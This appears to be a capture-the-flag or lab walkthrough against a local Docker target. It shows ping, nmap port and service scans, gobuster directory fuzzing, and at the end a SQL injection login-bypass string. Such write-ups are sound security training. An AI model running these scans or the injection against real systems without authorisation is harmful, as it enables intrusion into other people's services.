![image](https://github.com/user-attachments/assets/5aeeff3d-98f1-4b30-b5f1-3023544c972f)

We test the connection with the victim machine
```bash
ping -c 1 172.17.0.2
```
![image](https://github.com/user-attachments/assets/daa8b535-5c35-48f1-9480-41ac4c93f05c)

    ttl =64 ==> linux OS

## **As the victim machine is within reach, we will send a request for a response with the ports that are open.**

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
![image](https://github.com/user-attachments/assets/c525eb41-4e8a-4a9a-b7f3-641906f1ed77)

    -oG AllPorts = save the output in the AllPorts file.

## **Now we launch a port scan**

```bash
nmap -sCV -p21,22,80,3000 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/16069e6e-a237-472d-9164-09a792d99da0)

        -oN targeted = save the output in the targeted file.

## **We will apply fuzzing to discover new directories.**
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```

## **We found this

![image](https://github.com/user-attachments/assets/1a43b527-a6a8-4f42-ac2f-74ba0d140919)
![image](https://github.com/user-attachments/assets/a84f31d8-5011-40c2-9aae-d2108ee249b3)


USER' or 1=1-- -

